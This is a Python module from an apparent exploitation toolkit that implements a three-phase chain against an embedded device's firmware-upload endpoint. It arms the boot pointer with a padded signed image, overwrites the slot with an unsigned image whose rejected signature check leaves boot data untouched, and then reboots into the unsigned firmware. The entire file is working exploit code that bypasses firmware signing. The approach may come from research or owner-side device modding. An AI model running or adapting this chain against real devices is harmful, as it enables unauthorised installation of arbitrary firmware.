"""The three-phase firmware chain against `provision/image`.

    1 ARM    signed image (or header-only with --no-dump)
             -> esp_ota_end passes -> esp_ota_set_boot_partition() moves the
                boot pointer to the passive slot -> MCU stage bails, no reboot
    2 SWAP   unsigned image overwrites the same slot. Its signature check
             fails, but the handler bails before touching otadata.
    3 BOOT   reboot; the bootloader boots the slot with a hash check only.

Preconditions (checked, not assumed):
    * factory mode, with the HTTPS server reachable on port 443
    * the device has taken at least one official OTA, so the passive slot holds
      a signed image (for --no-dump)
    * `--official <image>` is supplied instead if it has not
"""

from __future__ import annotations

import time
from dataclasses import dataclass

from ..constants import G4_HEADER16, MCU_BUFF, PAD_DEFAULT
from ..errors import DeviceError, SafetyError, TransportError
from ..httpclient import DeviceHTTP, Response
from ..util import info, ok, warn
from .multipart import DEFAULT_IMAGE_NAME, Upload, image_upload, preserve_upload

_RESET_PATH = "/d/{did}/management/reset"
_IMAGE_PATH = "/d/{did}/provision/image"


@dataclass
class ChainResult:
    armed: bool = False
    swapped: bool = False
    rebooted: bool = False
    phase1: Response | None = None
    phase2: Response | None = None


def post_image(http: DeviceHTTP, did: str, token: str, upload: Upload, timeout: float = 600) -> Response:
    from ..constants import BOUNDARY

    http.timeout = timeout
    info(f"POST {_IMAGE_PATH.format(did=did)}  ({upload.description})")
    return http.request(
        "POST",
        _IMAGE_PATH.format(did=did),
        body=upload.body,
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "multipart/form-data; boundary=" + BOUNDARY.decode(),
        },
        declared_length=upload.declared_length,
        allow_early_close=True,
    )


def reset(http: DeviceHTTP, did: str, token: str) -> Response | None:
    info(f"GET {_RESET_PATH.format(did=did)}")
    try:
        # The device reboots without always closing the socket, so cap the wait
        # for a reply instead of sitting on the image-upload timeout.
        return http.get(
            _RESET_PATH.format(did=did),
            token,
            allow_early_close=True,
            timeout=15,
            attempts=1,
        )
    except TransportError as exc:
        # A reboot normally drops the connection mid-response.
        info(f"no response (rebooting?): {exc}")
        return None


def _looks_like_reboot(resp: Response) -> bool:
    text = (resp.body or "").lower()
    return "success" in text or "restart" in text


def arm(
    http: DeviceHTTP,
    did: str,
    token: str,
    *,
    version: str,
    official: bytes | None,
    no_dump: bool,
    header16: bytes | None = None,
    pad: int = PAD_DEFAULT,
    settle: float = 2.0,
    send_pad: bool = False,
    image_name: str = DEFAULT_IMAGE_NAME,
) -> Response:
    """Phase 1. Raises if the device reboots or reports success."""
    if pad <= MCU_BUFF:
        raise SafetyError(f"padding must exceed {MCU_BUFF} bytes, got {pad}")

    if no_dump:
        upload = preserve_upload(
            version,
            header16=header16 or G4_HEADER16,
            declared_extra=pad,
            image_name=image_name,
        )
    else:
        if not official:
            raise SafetyError("phase 1 needs an official signed image, or --no-dump")
        upload = image_upload(
            official,
            version,
            include_stm32=True,
            pad=0 if not send_pad else pad,
            declared_extra=0 if send_pad else pad,
            image_name=image_name,
        )

    resp = post_image(http, did, token, upload)
    if resp.status is None:
        warn(
            "the device closed the connection without a response "
            "(the MCU-size bail path; expected for the arm)"
        )
    else:
        info(str(resp))
        if _looks_like_reboot(resp):
            raise DeviceError(
                "the response looks like the reboot path. The arm is LOST.\n"
                "The manifest's STM32 size must be non-zero and the padding must exceed "
                f"{MCU_BUFF} bytes."
            )
    time.sleep(settle)
    if not http.alive():
        raise DeviceError("the device is no longer answering on :443. It rebooted, so the arm is LOST.")
    ok("device still up (no reboot): boot pointer moved, passive slot intact")
    return resp


def upload_official(
    http: DeviceHTTP,
    did: str,
    token: str,
    official: bytes,
    *,
    version: str,
    image_name: str = DEFAULT_IMAGE_NAME,
    timeout: float = 600,
) -> Response:
    """A normal signed OTA upload: ESP32 image only, no STM32 entry, no padding.

    The handler accepts the image, moves the boot pointer and reboots. The STM32
    entry exists in `arm` only to make the MCU stage bail and keep the device up
    for the unsigned swap; restoring the official image does not need it.
    """
    upload = image_upload(official, version, image_name=image_name)
    resp = post_image(http, did, token, upload, timeout=timeout)
    info(str(resp))
    if resp.status is not None and resp.status >= 400:
        raise DeviceError(f"official image rejected: {resp}")
    return resp


def swap(
    http: DeviceHTTP,
    did: str,
    token: str,
    firmware: bytes,
    *,
    version: str,
    settle: float = 2.0,
    image_name: str = DEFAULT_IMAGE_NAME,
) -> Response:
    """Phase 2. A non-200 response is the success condition."""
    upload = image_upload(firmware, version, image_name=image_name)
    resp = post_image(http, did, token, upload)
    if resp.status is None:
        info("no response (the signature rejection closed the connection)")
    else:
        info(str(resp))
    if resp.status == 200:
        raise DeviceError(
            "phase 2 returned 200: the unsigned image was accepted. Something is wrong; "
            "do NOT reboot. Investigate first."
        )
    ok("unsigned image written; the signature rejection is expected and otadata is untouched")
    time.sleep(settle)
    return resp


def run(
    ip: str,
    did: str,
    token: str,
    custom: bytes,
    *,
    version: str,
    official: bytes | None = None,
    no_dump: bool = True,
    header16: bytes | None = None,
    pad: int = PAD_DEFAULT,
    settle: float = 2.0,
    bind: str | None = None,
    port: int = 443,
    reboot: bool = True,
    send_pad: bool = False,
    image_name: str = DEFAULT_IMAGE_NAME,
) -> ChainResult:
    http = DeviceHTTP(ip, port, timeout=600, bind=bind)
    result = ChainResult()

    result.phase1 = arm(
        http,
        did,
        token,
        version=version,
        official=official,
        no_dump=no_dump,
        header16=header16,
        pad=pad,
        settle=settle,
        send_pad=send_pad,
        image_name=image_name,
    )
    result.armed = True

    result.phase2 = swap(
        http,
        did,
        token,
        custom,
        version=version,
        settle=settle,
        image_name=image_name,
    )
    result.swapped = True

    if reboot:
        reset(http, did, token)
        result.rebooted = True
        warn(
            "the custom firmware boots in PENDING_VERIFY. It must call "
            "esp_ota_mark_app_valid_cancel_rollback() or the next reboot rolls back."
        )
    return result
